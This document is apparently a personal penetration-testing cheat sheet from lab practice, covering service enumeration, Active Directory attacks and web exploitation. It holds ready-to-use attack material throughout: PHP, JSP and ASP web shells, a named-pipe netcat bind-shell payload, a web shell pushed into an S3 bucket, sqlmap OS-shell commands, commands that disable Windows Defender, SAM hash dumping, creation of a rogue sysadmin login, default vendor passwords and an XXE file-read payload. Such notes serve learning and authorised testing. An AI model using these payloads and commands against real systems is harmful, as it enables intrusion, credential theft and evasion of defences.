  - Community strings: in v2, determine whether the requested information can be viewed or not, thus can be seen as passwords

#### Configuration

- Daemon

  - All the settings in the [manpage](http://www.net-snmp.org/docs/man/snmpd.conf.html).

  - `cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'`

  - Dangerous Settings:

  - | **Settings**                                     | **Description**                                              |
    | ------------------------------------------------ | ------------------------------------------------------------ |
    | `rwuser noauth`                                  | Provides access to the full OID tree without authentication. |
    | `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
    | `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6. |

#### Interaction

1. Query the OIDs with their information

   ```bash
   snmpwalk -v2c -c public [IP]
   ```

2. Brute-force community strings (if version 1,2)

   ```bash
   onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt [IP]
   ```

    [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists

3. Brute-force OIDs after a community string is known

   ```bash
   braa <community string>@<IP>:.1.3.6.*
   ```

### 512-4 - Rservices

#### Generalities

- **Type:** Authentication

- `r-services` were the de facto standard for remote access between Unix operating systems until they were replaced by the Secure Shell (`SSH`) 
- 

#### Exploit

-  man-in-the-middle (`MITM`) attacks.

#### Configuration

- The `/etc/hosts.equiv` (global configuration) and `.rhosts` (per user configuration) file contains a list of trusted hosts, which are granted access without authentication.

- Additionally, the `+` modifier can be used within these files as a wildcard to specify anything.

  

#### Interaction

| **Command**                | **Service Daemon** | **Port** | **Description**                                              |
| -------------------------- | ------------------ | -------- | ------------------------------------------------------------ |
| `rcp` (remote copy)        | `rshd`             | 514      | Copy a file or directory bidirectionally. No warning for overwriting existing files. |
| `rsh` (remote shell)       | `rshd`             | 514      | Opens a shell without login. Relies upon the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rexec` (remote execution) | `rexecd`           | 512      | Runs shell commands. Requires authentication Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |
| `rlogin` (remote login)    | `rlogind`          | 513      | Logs in, through Authentication or the trusted entries in the `hosts.equiv` and `.rhosts` files. |

After Login:

- `rho [IP]`

  Lists all interactive sessions on the local network. The daemon periodically broadcasts information about logged-on users, so it might be beneficial to watch the network traffic.

- `ruser -al [IP]`

  Gives a more detailed account of all logged-in users over the network

### 623u - IPMI

#### Generalities

- **Type:**
- Purpose:
  - manage and monitor systems even if they are powered off or in an unresponsive state
  -  remote upgrades
  - Before the OS has booted to modify BIOS settings
  - When the host is fully powered down
  - Access to a host after a system failure
  - querying inventory information, reviewing hardware logs, and alerting using SNMP.
- Structure
  - The host system can be powered off, but the IPMI module requires a power source and a LAN connection to work correctly.
  - Systems that use the IPMI protocol are called Baseboard Management Controllers (BMCs).
  - If we can access a BMC during an assessment, we would gain full access  to the host motherboard and be able to monitor, reboot, power off, or  even reinstall the host operating system. 


#### Configuration

- Some unique default passwords

  | Product         | Username      | Password                                                     |
  | --------------- | ------------- | ------------------------------------------------------------ |
  | Dell iDRAC      | root          | calvin                                                       |
  | HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
  | Supermicro IPMI | ADMIN         | ADMIN                                                        |

#### Exploit

- IPMI 2.0

  During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes  place. This can be leveraged to obtain the password hash for ANY valid  user account on the BMC. 

  - Metasploit [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) module.

    ```bash
    msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
    msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts [IP]
    ```

  -  In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command

     `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` 

    which tries all combinations of upper case letters and numbers for an eight-character password.

#### Interaction

- nmap sctipt

- metasploit version scan

  ```shell
  msf6 > use auxiliary/scanner/ipmi/ipmi_version 
  ```


### 873 - Rsyinc

#### Generalities

- [Rsync](https://linux.die.net/man/1/rsync) is a fast and efficient tool for locally and remotely copying files.
- This [guide](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync) covers some of the ways Rsync can be abused (sometimes also without authentication)

#### Interaction

```bash
rsync -av --list-only rsync://[IP]/[SHARE]
```

-  If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH.

- To read: `rsync -av --list-only rsync://{HOST}/`

- To copy: `rsync -av rsync://{HOST}/{module} [YOUR DIRECTORY]`

### 1433 - msSQL

#### Generalities

- **Type: ** Database

- Purpose:
  - closed source and was initially written to run on Windows
  - Many other clients can be used to access msSQL, such as
    - [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15)
    - [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15)
    - [HeidiSQL](https://www.heidisql.com)
    - [SQLPro](https://www.macsqlclient.com)
    - [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)

-  Structure

   | Default Database | Description                                                  |
   | ---------------- | ------------------------------------------------------------ |
   | `master`         | Tracks all system information for an SQL server instance     |
   | `model`          | Acts as a structure for every new database  created. Any setting changed in the model database will be reflected in  any new database created after |
   | `msdb`           | The SQL Server Agent uses this database to schedule jobs & alerts |
   | `tempdb`         | Stores temporary objects                                     |
   | `resource`       | Read-only database containing system objects included with SQL server |

#### Configuration

- Initially, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`.
- **Dangerous settings**
  - Not using encryption to connect
  - The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
  - The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
  - Weak & default `sa` credentials. 

#### Interaction

- **Linux auth:**

  If credentials are known:

  ```bash
  mssqlclient.py [commonName]/[USER]@[IP] -windows-auth
  ```

- **Windows Authentication** 

  - To connect with windows authentication:

    ```cmd
    sqlcmd -S localhost -E
    ```

  - with the server authentication;

    ```cmd
    sqlcmd -S localhost -U your_username -P your_password
    ```

  - The interaction is the same as below, but you need to run `GO` after every command.

- **Default credentials:** `sa` and empty passwd 

```bash
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#Read tables
SELECT * FROM yourTableName;
#Read a specific row with a certain column value
SELECT * FROM yourTableName WHERE columnName = 'specificValue';
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```

### 1521 - ORACLE

#### Generalities

- **Type:**
- Purpose:
  - communication protocol that facilitates communication between Oracle databases and applications over networks.
- Structure
  - Can support `SSL/TLS` encryption
  -  it enables encryption between client and server communication through  an additional layer of security over the TCP/IP protocol layer.
  - Supports `IPv6`
  - The TNS listener listens for incoming connections in the port.
    - it will only accept connections from authorized hosts
    - it performs basic authentication using a combination of hostnames, IP  addresses, and usernames and passwords. 
    - It uses Oracle Net Services to encrypt the communication between the client  and the server.
  - a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. 
  - An instance is a set of processes and memory structures that interact to manage the database's data.

#### Configuration

- Oracle TNS configuration files, located in the `$ORACLE_HOME/network/admin` directory:

  - `tnsnames.ora`

    Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service:  name for the service, network location, and database or service name.

  - `listener.ora`

    server-side configuration file that defines the listener process's properties and parameter

- Password:

  - Oracle 9 has a default password, `CHANGE_ON_INSTALL`,
  - Oracle 10 has no default password set. 
  - The Oracle DBSNMP service also uses a default password, `dbsnmp` 

- `PlsqlExclusionList`

  user-created text file that needs to be placed in `$ORACLE_HOME/sqldeveloper`, containing the names of PL/SQL packages or types that  should be excluded from execution. It serves as a  blacklist that cannot be accessed through the Oracle Application Server.

  | **Setting**          | **Description**                                              |
  | -------------------- | ------------------------------------------------------------ |
  | `DESCRIPTION`        | name for the database and its connection type.               |
  | `ADDRESS`            | Network address of the database (hostname port)              |
  | `PROTOCOL`           | protocol used for communication with the server              |
  | `PORT`               | The port used for communication with the server              |
  | `CONNECT_DATA`       | Specifies the attributes of the connection, s.a. the service name or SID, protocol, and database instance identifier. |
  | `INSTANCE_NAME`      | The name of the database instance the client wants to connect. |
  | `SERVICE_NAME`       | The name of the service that the client wants to connect to. |
  | `SERVER`             | The type of server used for the database connection, such as dedicated or shared. |
  | `USER`               | The username used to authenticate                            |
  | `PASSWORD`           | The password used to authenticate                            |
  | `SECURITY`           | The type of security for the connection.                     |
  | `VALIDATE_CERT`      | Whether to validate the certificate using SSL/TLS.           |
  | `SSL_VERSION`        | The version of SSL/TLS to use for the connection.            |
  | `CONNECT_TIMEOUT`    | The time limit in seconds for the client to establish a connection to the database. |
  | `RECEIVE_TIMEOUT`    | The time limit in seconds for the client to receive a response from the database. |
  | `SEND_TIMEOUT`       | The time limit in seconds for the client to send a request to the database. |
  | `SQLNET.EXPIRE_TIME` | The time limit in seconds for the client to detect a connection has failed. |
  | `TRACE_LEVEL`        | The level of tracing for the database connection.            |
  | `TRACE_DIRECTORY`    | The directory where the trace files are stored.              |
  | `TRACE_FILE_NAME`    | The name of the trace file.                                  |
  | `LOG_FILE`           | The file where the log information is stored.                |

#### Interaction

If the client does not specify a SID, the default value defined in the `tnsnames.ora` file is used.

- Guess the `SID`

  - `nmap` brute forcing script

  - Oracle Database Attacking Tool (`ODAT`)

    ```bash
    ./odat.py all -s [IP]
    ```

- Log in

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID]
  ```

- Log in as the System Database Admin (`sysdba`)

  ```bash
  sqlplus [USER]/[PASSWD]@[IP]/[SID] as sysdba
  ```

- Commands

  -   [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) 
  - `select table_name from all_tables;`  list all available tables in the current database
  - `select * from user_role_privs;` show the privileges of the current user
  - `select name, password from sys.user$;` retrieve the password hashes

- Test if a File Upload is possible (e.g on Win)

  ```bash
  $ echo "Oracle File Upload Test" > testing.txt
  $ ./odat.py utlfile -s [IP] -d [SID] -U [USER] -P [PASSWD] --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
  $ curl -X GET http://[IP]/testing.txt	# Check if it worked
  ```

- Upload a shell (if a web server is run) to the root directory

  - Linux `/var/www/html`
  - Windows `C:\inetpub\wwwroot`



### 3389tu - RDP

#### Generalities

- **Type:** Authentication (remote)
- It opens a live session
- Structure:
  - typically utilizing TCP port 3389 as the transport protocol,  the connectionless UDP protocol can use port 3389 also for remote  administration.
  - For an RDP session to be established, both the network firewall and the  firewall on the server must allow connections from the outside.
  - all data, and especially the login process, is protected in the network  by its good encryption. However, many Windows systems do not insist on  this but still accept inadequate encryption.

#### Exploit

- The identity-providing certificates are merely self-signed by default, so the client cannot distinguish a genuine certificate from a forged one and generates a certificate warning for the user.

#### Interaction

- [rdp-sec-check.pl](https://github.com/CiscoCXSecurity/rdp-sec-check) can unauthentically identify the security settings of RDP servers based on the handshakes.

  ```bash
  ./rdp-sec-check.pl [IP]
  ```

- Authentication and connection to such RDP servers can be made, for example, using `xfreerdp`, `rdesktop`, or `Remmina` 

  ```bash
  xfreerdp /u:[USER] /p:"[PASSWD]" /v:[IP]
  ```



### 3632 distccd

**Distcc** is a tool that enhances the **compilation process** by utilizing the **idle processing power** of other computers in the network. When **distcc** is set up on a machine, this machine is capable of distributing its **compilation tasks** to another system. This recipient system must be running the **distccd daemon** and must have a **compatible compiler** installed to process the sent code.

Check if it's vulnerable to **CVE-2004-2687** to execute arbitrary code:

```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```

### 5000 - Docker Registry

#### Generalities

- Purpose:

  Docker images are organized within **Docker repositories** in the registry, each repository storing various versions of a specific image. The functionality provided allows for images to be downloaded  locally or uploaded to the registry, assuming the user has the necessary permissions.

### 5985-6 - WINRM

#### Generalities

- **Type:** Authentication 
- Purpose:
  - remote management protocol based on the command line.
  - WinRM must be explicitly enabled and configured starting with Windows 10
  - Windows Remote Shell (`WinRS`), which lets us execute arbitrary commands on the remote system. The program is included on Windows 7 by default. 
- Structure:
  - WinRM relies on `TCP` ports `5985` and `5986` for communication, with the last port `5986 using HTTPS`, as ports 80 and 443 were previously used for this task. 
  - In general, it only works for active directories

#### Interaction

 [evil-winrm](https://github.com/Hackplayers/evil-winrm) to log in

```bash
evil-wirm -i [IP] -u [USER] -p [PASSWD]
```

#### Exploit

The password is stored as an hash,  one-way function that takes any amount of data and returns a fixed size value.

Use responder to attack it: 

```
sudo responder -I tun0 -w -d 
```

it creates a fake shared folder in your network, that if it interacts with the attacked ip (e.g. through the parameter of a web page), will steal the password as an Hash.

The responder IP has to be loaded as a shared folder, i.e. `//<IP>/somefile`, if we want to do RFI.

### 3306 - MySQL

#### Generalities

**Type:** Database

- Purpose:

  - Open-source SQL relational database management system developed and supported by Oracle.
  - The MySQL clients can retrieve and edit the data
  - Ideally suited for applications such as *dynamic websites*
  - A MySQL database translates the commands internally into executable code and performs the requested actions.

- Structure:

  - The data is stored in tables with different columns, rows, and data types.

  - often stored in a single file with the file extension `.sql`

#### Configuration

`/etc/mysql/mysql.conf.d/mysqld.cnf`

**Dangerous settings:**

| **Settings**       | **Description**                                              |
| ------------------ | ------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.               |
| `password`         | Sets the password for the MySQL user.                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
| `debug`            | This variable indicates the current debugging settings       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations. |

- The entries of `user`,`password`, and `admin_address` are made in plain text
- The `debug` and `sql_warnings` settings provide  verbose information output in case of errors, which often contains sensitive content

#### Exploits

- SQL injection
- Read credentials

#### Interaction

```bash
 mysql -h [IP] -u root -p[PASSWD] --skip-ssl
```

The most important databases for the MySQL server are the `system schema` (`sys`) and `information schema`. The system schema contains tables, information, and metadata necessary  for management, see the [reference manual](https://dev.mysql.com/doc/refman/8.0/en/system-schema.html#:~:text=The mysql schema is the,used for other operational purposes) of MySQL. The information schema also contains metadata, but has less information than the previous one.

| **Command**                                          | **Description**                                     |
| ---------------------------------------------------- | --------------------------------------------------- |
| `select version();`                                  | Get version                                         |
| `show databases;`                                    | Show all databases.                                 |
| `use <database>;`                                    | Select one of the existing databases.               |
| `show tables;`                                       | Show all available tables in the selected database. |
| `show columns from <table>;`                         | Show all columns in the selected database.          |
| `select * from <table>;`                             | Show everything in the desired table.               |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.    |



### 6379 - REDIS

**Type:** Database

 `redis-cli -h [ip]`

Once inside redis environment `info` return information about the  server

- `Server` info: get version of redis
- `Keyspace` list of dictionaries (dictionaries) with statistics: number of keys, number of keys with expiration
- `select {index number of the database}`
- `keys *` List all the keys in the database
- `get {key}`

## Active Directory

It is a collection of machines, called *clients*, handled by the *domain controller (DC)*, which is a master server of one domain, thus it creates one (and only one) domain. 

The goal is to get local admin on the domain controller. 

Port `88` is always open, since it hosts the DC, running a process called *Kerberos*. Kerberos is a way for users to authenticate in the network, even if they don't have an account for it.

There could be multiple DCs. A *trust escalation* is a privilege escalation in which you go from a DC to the other, if they trust each other. The trivial one is the one from child to parent. 

*Forest* is the parent of a collection of machines that has the same hierarchy.

1. Through anonymous or guest authentication, try to get access to

   - SMB

   - RPC

   - LDAP

2. Get a list of valid usernames

3. Password spraying

   ```bash
    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce
   ```

   ```bash
    nxc smb 10.10.10.161 -u user.txt -p user.txt --no-bruteforce --local-auth
   ```

   ```bash
   nxc smb 10.10.10.161 -u "" -p "" --pass-pol
   ```

   

4. Get a session in WinRM

5. If you cannot, Kerberos bruteforcing

   ```bash
   GetNPUsers.py htb.local/ -usersfile user.txt -request -dc-ip 10.10.10.161 
   ```

6. Dump and analyze th database

   ```bash
    bloodhound-python -u svc-alfresco -p s3rvice -ns 10.10.10.161 --domain htb.local -c All --zip --dns-tcp
   ```

   

### nxc

Generic tool to navigate all the authentication protocols. The guide: https://www.netexec.wiki/

`nxc [PROTOCOL] [TARGET] -u [USERNAME] -p [PASSWORD] --port [PORT] [OPTIONS]`

To do *password spraying*, you can put a file instead of the username, with the most common ones, and using the `--continue-on-success` flag

To enumerate the users, use th flag `--users` or `--active-users` for ldap.

Possible protocols:

	- ftp
	- smb
	- ssh
	- vnc
	- rdp
	- winrm
	- msSQL

```bash
windapsearch -d htb.local --dc-ip 10.10.10.161 --users --full > users.txt
```

### Hash Dumping

If you have have administrator privileges, you can dump other users passwords hashes:

`reg save hklm\sam sam`

`reg save hklm\system system`

Transfer the file on your device and run `samdump2 [system file] [sam file]`

Also in meterpreter `hashdump` and `lsa_dump` could work.



# Web

## Introduction

### **HTTP Request**

```
[METHOD] /[PATH]?p1=[val1]&p2=[val2] HTTP/[VERSION]`
`Host:  [example.com]`
`[Head1: Val1]`
`...
[PAYLOAD]
```

### **Parameters**

Parameters are very important to spot, and they are grouped in different categories:

- **REFLECTED**: 

  Parameters that are reflected, i.e. they appear in the request and in the response. 

  - Template Injection (SSTI / CSTI)

  - XXS/HTML Injection 

- **FUNCTIONAL**: 

  They have a functional scope (they could be reflected or not).

  - LFI / RFI (file fetching is their function), 

  - SQL injection (query to a database e.g. a search-bar or a login),

  - SSRF (URL fetching), 

  - OS injection (command execution, execute commands on the server).


- **FORMATTED:** 

  Parameters that appear in JSON or XML format

  - SSPP

  - XXE


`paramfuzz(query_url)` to fuzz get parameters

## Enumeration

### Fingerprinting

- `web_enum [URL]`
- Browser Extensions:
  - Wappalyzer
  - RetireJS
  - Public Websites -> URLScan / WebCheck XYZ

### Crawling

- `Burp Suite Spider`
- `crawl [URL]`


### Discovery

#### VHosts

- Purpose:

  A virtual host is a alternate, parallell hostname for your box that  allows your box to react differently depending on what alternate name  visitors aims at.  

- Vhosts vs Subdomains:

  - `Subdomains`: These are extensions of a main domain name (e.g., `blog.example.com` is a subdomain of `example.com`). `Subdomains` typically have their own `DNS records`, pointing to either the same IP address as the main domain or a  different one. They can be used to organise different sections or  services of a website.

  - `Virtual Hosts` (`VHosts`): Virtual hosts are  configurations within a web server that allow multiple websites or  applications to be hosted on a single server. They can be associated  with top-level domains (e.g., `example.com`) or subdomains (e.g., `dev.example.com`). Each virtual host can have its own separate configuration, enabling precise control over how requests are handled.

- Types:

  - Name-based: relies solely on the `HTTP Host header` to distinguish between websites.
  - IP-based
  - Port-based

**Fuzzing**

```bash
vhost [URL]
```

Add found subdomains to `/etc/hosts` and scan recursively

#### Directories and files

Gbuster or Ffuf to discover hidden files or directories

```bash
dirfuzz [URL]
```

-  **HTTP status code** 
   -  `200`  request was successful
   -  `403`  forbidden to access the resource.
   -  `301`  being redirected (not a failure case)

**Important files:**

- `.swp` *swap files:* 

  Swap files store the changes that are made to the buffer. If Vim or your computer crashes, the swap files allow you to recover those changes. Swap files also provide a way to avoid multiple instances of an editor from editing the same file.

  - `vim -r [swap file]` to read it
  - `strings [swap file]`  to only display the human-readable text if the file is unrecoverable

- `robots.txt`

  It is common for websites to contain a `robots.txt` file,  whose purpose is to instruct search engine web crawlers bots which resources can and cannot be accessed for indexing. The `robots.txt` file can provide valuable information such as the location of private files and admin pages. 
  
  `User-agent`: This line specifies which crawler or bot the following rules apply to. A wildcard (`*`) indicates that the rules apply to all bots. 
  
  `Directives`: specific instructions to the user-agent. Common directives:
  
  - `Disallow`
  
    paths that the bot can't crawl.
  
  - `Allow`
  
    Permits the bot to crawl specific paths, even if in`Disallow`.
  
  - `Crawl-delay`
  
    Sets a delay (in sec) between successive requests to avoid overloading
  
  - `Sitemap`
  
    Provides the URL to an XML sitemap for more efficient crawling.
  
- `.well-known`

  It is a standardized directory, typically accessible in `/.well-known/` from the web server , that centralizes a website's critical metadata, including configuration files and information related to its services,  protocols, and security mechanisms. Some common URIs:

  - `security.txt`

    Contains contact information for security researchers to report vulnerabilities.

  - `change-password`

    Provides a standard URL for directing users to a password change page.

  - `openid-configuration`

    Defines configuration details for OpenID Connect, an identity layer on top of the OAuth 2.0 protocol. Interesting for *endpoint discovery*.

  - `assetlinks.json`

    Used for verifying ownership of digital assets (e.g. apps) associated with a domain.

  - `mta-sts.txt`

    Specifies the policy for SMTP MTA Strict Transport Security (MTA-STS) to enhance email security.
  
- `/.git`

  Hashes of a git folder. To reconstruct it:

  ```bash
  git-dumper [URL] [OUTPUT DIR]
  ```


#### Amazon Buckets

The are different types of subdomains, for example `s3.` are amazon buckets subdomains on the cloud. Always add the subdomains to the `/ets/hosts/` file next to the domain..

Use `awscli` to interact with them. 

To list the buckets:
`aws --endpoint=http://s3.thetoppers.htb s3 ls`

To list the objects inside the buckets just specify the bucket at the end of the previous command:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

If php files are shown, it means that the bucket is handling the php page. Thus creating an appropriate php file and coping it in the bucket, will open a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

## Exploitation

### Proxy

#### Host Misrouting

How to, given a domain, reach other subdomains with the same IP address. Thus, we want to brute force the “etc/hosts” file of the proxy.

After adding the domain to my `/etc/hosts` file:

```bash
gobuster vhost -u http://[DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Ignore any 400 Status output, since it means that the proxy refused your request.

### Server-side

#### File Read

Linux:

- `/etc/passwd`
- ssh keys
- web applications credentials
  - where does the application save the passwords?
- Opened services 

#### SQL Injections

Each time the user wants to log in, the web application sends the log-in page input to the SQL Service, comparing it with stored database entries for that specific user. 

 Post-log-in, the web application will set the user a special permission in the form of a cookie or authentication token that associates his online presence with his authenticated presence on the website. This cookie is stored both locally, on the user's browser storage, and the webserver.

**Vulnerability:** 

- Add  `'#` in the parameter

- Use sqlmap to confirm th

  ```bash
  sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs --level=5 --risk=3 --flush-session {--cookie=['COOKIE'] --dbms=[DATABASE]}```  
  ```

  - A common database to try MySQL or PosrGreSQL for php applications

  - To run code execution

    ```bash
    sqlmap -u "http://[URL]?[QUERY]" -p [PARAM] search --dbs {--cookie=['COOKIE'] --dbms=[DATABASE]}--os-shell
    ```



#### Local / Remote File Injection (LFI/RFI)

LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application. 

A common example is when an application uses the path to a file as input. If the application treats this input as trusted, and the required sanitary checks are not performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code execution as well.

We test the page parameter to see if we can include files on the target system in the server response. We
will test with some commonly known files that will have the same name across networks, Windows
domains, and systems which can be found [`here`](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt).

One of the most common files that a penetration tester
might attempt to access on a Windows machine to verify LFI is the hosts file,
`WINDOWS\System32\drivers\etc\hosts` (this file aids in the local translation of host names to IP
addresses). The ../ string is used to traverse back a directory, one at a time. Thus multiple ../ strings are
included in the URL so that the file handler on the server traverses back to the base directory i.e. C:\

```
page=../../../../../../../../windows/system32/drivers/etc/hosts
```

For instance, the file inclusion can be made possible because in the backend the `include()` method of PHP is
being used.

In Linux, there is the `/etc/passwd` file.

For a **RFI** you load the file remotely, e.g. though a server.

#### XML Eternal Entities (XXE or XEE)

*XML* is a markup language  and file format for storing, transmitting, and reconstructing arbitrary data.  Although the design of XML focuses on documents, the language is widely used for the representation of arbitrary data structures, such as those used in web services.

*XML Entities* are a way of representing an item of data within an XML
document, instead of using the data itself. Various entities are built in to the specification of the XML language. For example, the entities `&lt;` and `&gt;` represent the characters < and > .

An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. Note that a parser transforms raw data into a structured format.

Using Burpsuit responder, one can try to read a file to check if the XXE vulnerability is indeed possible:

```php
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "FILE"> ]>
<data>&example;</data>
```

- FILE:
  - Linux: `"/etc/passwd"`
  - Windows file: `'file"///c:/windows/win.ini'`
- data: vulnerable parameter, the *reflected* one.



#### Template Injection SSTI

**Template Engines** are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client.

**Server-side template injection** is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.

#### Identification of the template engine

![image-20240922190834802](/home/damuna/.config/Typora/typora-user-images/image-20240922190834802.png)

special characters commonly used in
template expressions:
`{{7*7}}`
`${7*7}`
`<%= 7*7 %>`
`${{7*7}}`
`#{7*7}`

Some of these payloads can also be seen in the previous image and are used to identify SSTI vulnerabilities.
If an SSTI exists, after submitting one of them, the web server will detect these expressions as valid code
and attempt to execute them, in this instance calculating the mathematical equation 7*7, which is equal to 49.
Even if the code is not directly executed, an error message can indicate what is the engine used. <then, go to Hacktrix.

### Client-side

#### Authentication

##### Type Juggling

PHP type juggling vulnerability occurs when a loose comparison operator  (== or!=) is used in the place of a strict comparison operator (===  or!==) in a situation where the attacker has access to one of the  variables being compared. 

This vulnerability may cause the application to provide an unexpected  true or false response and may result in serious authorization and/or  authentication problems. 

![image-20241021201733300](/home/damuna/.config/Typora/typora-user-images/image-20241021201733300.png)

E.g. the following php code handling an authentication is vulnerable:

```php
if (strcmp($username , $_POST['username']) == 0) {
	if (strcmp($password, $_POST['password']) == 0) {
```

To exploit it, one can change the POST data of the web request using BurpSuit in an empty array, since If we convert those variables into empty arrays ( `$username[] & $password[] `), the comparison will return NULL , and NULL == 0 will return true, causing the login to be successful.

#### XSS 

- **Generalities:** 

  Cross-site scripting (also known as XSS) normally allow an  attacker to masquerade as a victim user, to carry out any actions that  the user is able to perform, and to access any of the user's data. 

- **Verify:**

  You can confirm most kinds of XSS vulnerability by injecting a payload  that causes your own browser to execute some arbitrary JavaScript. It's  long been common practice to use the `alert()` function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called.

- **Types:**

  - [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) is the simplest variety of cross-site scripting. It arises when an  application receives data in an HTTP request and includes that data  within the immediate response in an unsafe way.
  - [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) (also known as persistent or second-order XSS) arises when an  application receives data from an untrusted source and includes that  data within its later HTTP responses in an unsafe way.        
  - [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) (also known as [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)) arises when an application contains some client-side JavaScript that  processes data from an untrusted source in an unsafe way, usually by  writing the data back to the DOM.        

#  Shells

[ReverseShellGenerator](https://www.revshells.com/)

## Reverse Shell

With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.

You want to use a [common port](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/4/html/security_guide/ch-ports#ch-ports) like `443` which usually is for `HTTPS` connections, so that it does not  get blocked by firewalls.

### Firewall evasion Windows

- Disable Windows Defender antivirus (AV)

  ```powershell
   Set-MpPreference -DisableRealtimeMonitoring $true
  ```


## Bind Shell

The `target` system has a listener started and the attacker directly connects to that port. So, there needs to be a lister opened or that we can start. Bind shells rely on incoming connections allowed through the firewall on the server-side, which is not common.

We can use `netcat` to connect to that port and get a connection to the shell. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another  connection immediately. However, if the bind shell command is stopped  for any reason, or if the remote host is rebooted, we would still lose  our access to the remote host and will have to exploit it again to gain  access.

1. Bind a bash shell on the target (payload)

   ```bash
   rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
   ```

2. On your machine, connect though netcat

   ```bash
   nc -nv [IP] [PORT]
   ```

   

## Web Shell

A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page.

`/usr/share/laudanum` includes injectable files for many different web application languages.

You may run into some implementations that randomize filenames on upload.

### Writing a Web Shell

**Code: php**

```php
<?php system($_REQUEST["cmd"]); ?>
```

 [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

**Code: jsp**

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Code: asp**

```asp
<% eval request("cmd") %>
```

### Uploading a Web Shell

Now we have to write one of the web shells above in the web root

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
